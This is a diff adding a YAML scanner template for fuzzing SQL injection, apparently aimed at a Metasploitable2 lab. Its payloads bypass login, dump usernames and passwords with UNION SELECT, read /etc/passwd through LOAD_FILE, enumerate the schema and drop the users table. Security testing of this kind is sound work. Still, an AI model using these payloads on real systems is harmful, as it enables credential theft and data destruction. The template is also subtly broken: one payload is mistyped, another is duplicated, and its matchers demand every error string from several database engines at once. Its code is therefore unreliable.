@@ -1,0 +1,82 @@
+id: sql-injection-fuzzing
+info:
+  name: SQL Injection Fuzzing Detection
+  author: trandieuquynh
+  severity: high
+  description: Phát hiện lỗ hổng SQL Injection bằng kỹ thuật fuzzing
+  tags: sql-injection, metasploitable2, fuzzing
+
+http:
+  - url: http://{{Hostname}}/vulnerable.php?id={{payload}}
+    method: GET
+    headers:
+      Accept: application/json, text/html
+      Accept-Language: en-US,en;q=0.5
+      User-Agent: Mozilla/5.0
+  
+  - url: http://{{Hostname}}/login.php
+    method: POST
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password={{payload}}
+
+    payloads:
+      payload:
+        - "' OR 1=1 --"
+        - "' UNION SELECT null, username, password FROM users --"
+        - "' ADD 1=CONVERT(int, (SELECT user())) --"
+        - "' OR SLEEP(5) --"
+        - "' AND 1=1--"
+        - "admin'"
+        - "' UNION ALL SELECT NULL, NULL, LOAD_FILE('/etc/passwd') --"
+        - "' AND 'a' = 'a' --"
+        - "'; DROP TABLE users --"
+        - "' OR SLEEP(5) --" 
+        - "'; SELECT table_name FROM information_schema.tables --"
+        - "'; SELECT column_name FROM information_schema.columns WHERE table_name='users' --"
+        - "' AND IF(1=1, SLEEP(5), 0) --"
+        - "' AND 1=2 --"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "You have an error in your SQL syntax"
+          - "Unknown column 'column_name' in 'field list'"
+          - "SQL syntax error near"
+          - "Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given"
+          - "Got error 28 from storage engine"
+          - "mysql error"
+          - "syntax error"
+          - "Warning"
+          - "Unclosed quotation mark after the character string"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+          - 500
+          - 400
+
+      - type: regex
+        regex:
+          - "SQLSTATE\\[42000\\]: Syntax error or access violation"
+          - "ORA-00933: SQL command not properly ended"
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "Welcome, (.*)!"
+          - "user=(.*);"
+          - "Database: (.*)"
+          - "Tables: (.*)" 
+          - "Columns: (.*)"  
+      
+      - type: json 
+        path: $.data.username
+
+
+
